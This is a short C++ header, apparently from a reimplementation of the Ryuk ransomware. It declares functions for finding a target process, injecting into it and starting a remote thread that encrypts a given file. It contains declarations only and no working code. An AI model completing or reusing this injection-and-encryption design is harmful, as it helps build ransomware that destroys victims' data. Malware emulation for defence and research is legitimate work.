#ifndef RYUK_PROCESS_INJECT_H_
#define RYUK_PROCESS_INJECT_H_

#include <cstdio>
#include <map>

#include <windows.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>

namespace ryuk {

    struct ProcessInfo;

    typedef INT(__stdcall EncryptionProcedureFunc)(const TCHAR*);

    ProcessInfo* GetProcessInfo(int size);

    DWORD InjectProcess(const TCHAR* processName);

    BOOL AttemptInjection(const ProcessInfo* info);

    BOOL CreateEncryptionThread(DWORD dwTargetProcessPID, const TCHAR* tFileToEncrypt, const SIZE_T iFileLen, EncryptionProcedureFunc EncryptionProcedureL, std::map<HANDLE, LPVOID>* processExMemory);

}// namespace ryuk

#endif RYUK_PROCESS_INJECT_H_
